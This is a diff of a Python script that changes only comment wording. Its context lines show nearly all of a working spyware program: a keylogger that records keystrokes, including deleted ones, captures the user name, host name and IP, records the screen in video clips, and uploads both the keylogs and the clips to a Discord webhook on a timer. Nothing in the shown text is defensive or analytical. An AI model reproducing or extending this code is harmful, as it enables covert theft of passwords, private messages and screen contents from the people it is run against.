@@ -15,13 +15,13 @@ FRAME_COUNT = FPS * DURATION
 
 WEBHOOK_URL = "YOUR_WEBHOOK_URL" # Your discord webhook
 
-# --- Global variables for keylogging ---
+#  variables for keylogging 
 logged_keys_buffer = []
 deleted_keys_buffer = []
 last_log_send_time = time.time()
 KEYLOG_INTERVAL = 30 # Send keylogs every 30 seconds
 
-# --- System Information ---
+# System Information 
 USER = getpass.getuser()
 HOST = socket.gethostname()
 try:
@@ -30,7 +30,7 @@ except (requests.exceptions.RequestException, KeyError):
     IP = "Could not retrieve IP"
 START_TIME = datetime.utcnow().isoformat()
 
-# --- Helper function for sending embeds ---
+# Helper function for sending embeds
 def send_embed(title, description, color=3447003):
     """Sends an embed message to the configured webhook."""
     try:
@@ -45,7 +45,7 @@ def send_embed(title, description, color=3447003):
     except requests.exceptions.RequestException as e:
         print(f"Error sending embed: {e}")
 
-# --- Keylogging functionality ---
+# Keylogging
 def on_press(key):
     """Callback function for key presses."""
     global logged_keys_buffer, deleted_keys_buffer
@@ -58,17 +58,17 @@ def on_press(key):
             elif key == keyboard.Key.space:
                 key_str = " "
             elif key == keyboard.Key.backspace:
-                # Handle backspace: remove the last logged character
+                #  backspace = remove the last logged character
                 if deleted_keys_buffer and logged_keys_buffer:
-                    # If we have deleted words recorded, we try to simulate backspace there too
+                    # If we have deleted words recorded, we try to put backspace there too
                     deleted_keys_buffer.append(logged_keys_buffer.pop())
                 elif logged_keys_buffer:
                     logged_keys_buffer.pop()
-                key_str = None # Don't append anything for backspace itself
+                key_str = None # Dont append anything for "backspace"
             else:
                 key_str = f" [{str(key).replace('Key.', '').upper()}] " # Format other special keys
     except AttributeError:
-        # For keys that don't have a .char attribute (like modifier keys)
+        # For keys that don't have a .char attribute (such as modifier keys)
         if key == keyboard.Key.enter:
             key_str = " [ENTER] "
         elif key == keyboard.Key.space:
@@ -90,14 +90,14 @@ def format_keylog_embed():
     logged_content = "".join(logged_keys_buffer)
     deleted_content = "".join(reversed(deleted_keys_buffer)) # Show deleted keys in order they were deleted
 
-    # Construct the embed title and description
+    # Create the embed title and description
     title = f"Keys logged"
     description = f"> **Logged Data:**\n```\n{logged_content}\n```"
 
     embed_data = {
         "title": title,
         "description": description,
-        "color": 808080, # Grey color
+        "color": 808080, # grey
         "timestamp": datetime.utcnow().isoformat(),
         "fields": [
             {"name": "IP Address", "value": IP, "inline": True},
@@ -110,7 +110,7 @@ def format_keylog_embed():
 def send_keylogs():
     """Sends the buffered keylogs as a formatted embed."""
     if not logged_keys_buffer and not deleted_keys_buffer:
-        return # Nothing to send
+        return # nothing to send.
 
     embed_payload = format_keylog_embed()
 
@@ -120,7 +120,7 @@ def send_keylogs():
         }, timeout=10)
         if response.status_code in (200, 204):
             print("Keylogs sent successfully.")
-            # Clear buffers only upon successful send
+            # Clear buffers only on a successful send
             logged_keys_buffer.clear()
             deleted_keys_buffer.clear()
         else:
@@ -128,7 +128,7 @@ def send_keylogs():
     except requests.exceptions.RequestException as e:
         print(f"Error sending keylogs: {e}")
 
-# --- Screen recording ---
+# Screen recording
 def record_screen(filename):
     """Records the screen for a fixed duration and saves it to a file."""
     with mss.MSS() as sct:
@@ -147,22 +147,22 @@ def record_screen(filename):
                 for _ in range(FRAME_COUNT):
                     img = sct.grab(monitor)
                     frame = np.array(img)
-                    frame = frame[:, :, :3] # BGRA -> RGB
-                    frame = frame[:, :, ::-1] # Flip to get correct RGB order
+                    frame = frame[:, :, :3] 
+                    frame = frame[:, :, ::-1] 
                     writer.append_data(frame)
         except Exception as e:
             print(f"Error during screen recording: {e}")
-            # Attempt to clean up potentially incomplete file
+            # attempt to clean up potentially incomplete file
             if os.path.exists(filename):
                 os.remove(filename)
 
-# --- File upload ---
+# File upload
 def send_file(filename):
     """Uploads the recorded video file to the webhook."""
     try:
         with open(filename, "rb") as f:
             files = {"file": (filename, f, "video/mp4")}
-            response = requests.post(WEBHOOK_URL, files=files, timeout=60) # Increased timeout for uploads
+            response = requests.post(WEBHOOK_URL, files=files, timeout=60) # timeout for uploads
         return response.status_code in (200, 204)
     except FileNotFoundError:
         print(f"Error: File not found at {filename}")
@@ -171,28 +171,28 @@ def send_file(filename):
         print(f"Error uploading file: {e}")
         return False
 
-# --- Main loop and threading ---
+# Main loop and threading 
 def main_loop():
     """Manages the recording, uploading, and keylogging cycles."""
     global last_log_send_time
     clip_counter = 0
 
-    # ✔ Startup identity message
+    # Startup message
     send_embed(
         "🟢 Recorder Online",
         f"User: **{USER}**\nMachine: **{HOST}**\nStatus: Active",
         color=5763719
     )
 
-    # Start the keyboard listener in a separate thread
+    # start the keyboard listener in a separate thread
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
 
     while True:
         current_time = time.time()
 
-        # --- Keylogging Interval Check ---
-        # Send keylogs if interval has passed or if there's data accumulated
+        # Keylogging Interval Check 
+        # send keylogs if interval has passed or if there's data accumulated
         if current_time - last_log_send_time >= KEYLOG_INTERVAL or logged_keys_buffer:
             send_keylogs()
             last_log_send_time = current_time
@@ -200,7 +200,7 @@ def main_loop():
         clip_counter += 1
         filename = f"clip_{datetime.now().strftime('%H%M%S')}_{clip_counter}.mp4"
 
-        # --- Recording ---
+        # Recording
         send_embed(
             "🎥 Recording",
             f"Clip #{clip_counter}",
@@ -208,7 +208,7 @@ def main_loop():
         )
         record_screen(filename)
 
-        # --- Uploading ---
+        # Uploading 
         send_embed(
             "📤 Uploading",
             f"Clip #{clip_counter}",
